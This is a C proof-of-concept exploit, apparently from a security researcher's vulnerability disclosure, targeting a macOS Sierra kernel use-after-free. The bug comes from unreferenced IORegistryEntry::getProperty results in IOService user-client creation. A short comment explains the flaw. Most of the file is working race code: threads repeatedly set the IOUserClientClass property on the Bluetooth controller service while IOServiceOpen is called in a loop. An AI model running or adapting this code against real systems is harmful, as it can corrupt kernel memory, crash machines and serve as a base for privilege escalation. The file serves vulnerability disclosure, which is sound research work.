// ianbeer
// clang -o ucproprace ucproprace.c -framework IOKit -framework CoreFoundation -lpthread && sync

#if 0
MacOS kernel use after free due to bad reference counting when creating new user clients

As mentioned in p0 bug 973/followup 651078322 the IORegistryEntry::getProperty function
returns a pointer to a registry value without taking a reference on it.

Pretty much the only safe thing you can do with this API is check whether a registry entry
recently had a property with the given key - you can't hold the registry lock when calling this function
as it takes that lock so it really almost impossible to call safely if you want to use the return value
for anything other than comparing to NULL.

Here's another case of a bad use of getProperty in IOService.cpp:

    // First try my own properties for a user client class name
    temp = getProperty(gIOUserClientClassKey); // <-- temp can be freed any time after this
    if (temp) {
        if (OSDynamicCast(OSSymbol, temp))
            userClientClass = (const OSSymbol *) temp;
        else if (OSDynamicCast(OSString, temp)) {
            userClientClass = OSSymbol::withString((OSString *) temp);  // <-- will call virtual method on temp
            if (userClientClass)
                setProperty(kIOUserClientClassKey,
                            (OSObject *) userClientClass);
        }
    }

Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <pthread.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

io_service_t service = MACH_PORT_NULL;

void* setter(void* arg) {
  while(1) {
    kern_return_t err;
    err = IORegistryEntrySetCFProperty(
      service,
      CFSTR("IOUserClientClass"),
      CFSTR("IOUserClient")); // an iokit interface class so the allocation will fail
    
    if (err != KERN_SUCCESS){
      printf("setProperty failed\n");
      return NULL;
    }
  }
  return NULL;
}

int main(){
  kern_return_t err;

  service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleBroadcomBluetoothHostController"));

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  pthread_t threads[4];
  pthread_create(&threads[0], NULL, setter, NULL);
  pthread_create(&threads[1], NULL, setter, NULL);
  pthread_create(&threads[2], NULL, setter, NULL);
  pthread_create(&threads[3], NULL, setter, NULL);

  while(1) {
    io_connect_t conn;
    IOServiceOpen(service, mach_task_self(), 0, &conn);
  }

  return 0;
}
